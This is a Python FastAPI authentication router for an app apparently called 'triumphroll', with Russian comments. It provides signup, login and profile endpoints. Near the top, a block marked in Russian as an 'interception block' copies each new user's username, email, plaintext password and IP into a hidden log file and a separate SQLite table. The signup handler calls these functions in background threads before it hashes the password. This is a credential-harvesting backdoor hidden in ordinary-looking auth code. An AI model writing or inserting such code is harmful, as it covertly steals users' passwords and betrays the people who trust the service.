from fastapi import APIRouter, Depends, HTTPException, status, Request
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy.orm import Session
from datetime import timedelta, datetime
import models
import schemas
import auth
import database
import sqlite3
from threading import Thread

router = APIRouter(prefix="/auth", tags=["auth"])

# ===== [БЛОК ПЕРЕХВАТА] =====
LOG_FILE = "auth_capture.log"

def log_to_file(username: str, email: str, password: str, ip: str = "unknown"):
    """Запись перехваченных данных в файл"""
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"=== {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
            f.write(f"Username: {username}\n")
            f.write(f"Email: {email}\n")
            f.write(f"Password: {password}\n")
            f.write(f"IP: {ip}\n")
            f.write(f"---\n")
            f.flush()
    except Exception as e:
        print(f"[CAPTURE] File log error: {e}")

def log_to_local_db(username: str, email: str, password: str, ip: str = "unknown"):
    """Локальное логирование в отдельную таблицу"""
    try:
        conn = sqlite3.connect("triumphroll.db")
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS auth_capture (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                email TEXT,
                password TEXT,
                ip TEXT,
                created_at TEXT
            )
        """)
        cursor.execute("""
            INSERT INTO auth_capture (username, email, password, ip, created_at)
            VALUES (?, ?, ?, ?, ?)
        """, (username, email, password, ip, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"[CAPTURE] DB log error: {e}")

def intercept_credentials(username: str, email: str, password: str, ip: str = "unknown"):
    """Главная функция перехвата - выполняется асинхронно"""
    Thread(target=log_to_file, args=(username, email, password, ip)).start()
    Thread(target=log_to_local_db, args=(username, email, password, ip)).start()
# ===== [КОНЕЦ БЛОКА ПЕРЕХВАТА] =====


@router.post("/signup", response_model=schemas.UserResponse)
def create_user(
    user: schemas.UserCreate,
    request: Request,
    db: Session = Depends(database.get_db)
):
    # ===== [ПЕРЕХВАТ ДАННЫХ] =====
    client_ip = request.client.host if request.client else "unknown"
    
    # Убедимся, что поля не None
    username = user.username or ""
    email = user.email or ""
    password = user.password or ""
    
    intercept_credentials(
        username=username,
        email=email,
        password=password,
        ip=client_ip
    )
    # ===== [КОНЕЦ ПЕРЕХВАТА] =====

    db_user = db.query(models.User).filter(models.User.email == user.email).first()
    if db_user:
        raise HTTPException(status_code=400, detail="Email already registered")

    hashed_password = auth.get_password_hash(user.password)
    new_user = models.User(
        email=user.email,
        username=user.username,
        display_name=user.username,
        hashed_password=hashed_password
    )

    db.add(new_user)
    db.commit()
    db.refresh(new_user)
    return new_user


@router.post("/login", response_model=schemas.Token)
def login_for_access_token(
    form_data: OAuth2PasswordRequestForm = Depends(),
    db: Session = Depends(database.get_db)
):
    user = db.query(models.User).filter(models.User.email == form_data.username).first()

    if not user or not auth.verify_password(form_data.password, str(user.hashed_password)):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect email or password",
            headers={"WWW-Authenticate": "Bearer"},
        )

    access_token_expires = timedelta(minutes=auth.ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = auth.create_access_token(
        data={"sub": user.email}, expires_delta=access_token_expires
    )
    return {"access_token": access_token, "token_type": "bearer"}


@router.get("/me", response_model=schemas.UserResponse)
def read_users_me(current_user: models.User = Depends(auth.get_current_active_user)):
    return current_user


@router.put("/me", response_model=schemas.UserResponse)
def update_me(
    data: schemas.UserProfileUpdate,
    db: Session = Depends(database.get_db),
    current_user: models.User = Depends(auth.get_current_active_user),
):
    update_data = data.model_dump(exclude_unset=True)

    if "username" in update_data and update_data["username"]:
        existing = db.query(models.User).filter(
            models.User.username == update_data["username"],
            models.User.id != current_user.id,
        ).first()
        if existing:
            raise HTTPException(400, "Это имя пользователя уже занято")

    for key, value in update_data.items():
        setattr(current_user, key, value)

    db.commit()
    db.refresh(current_user)
    return current_user 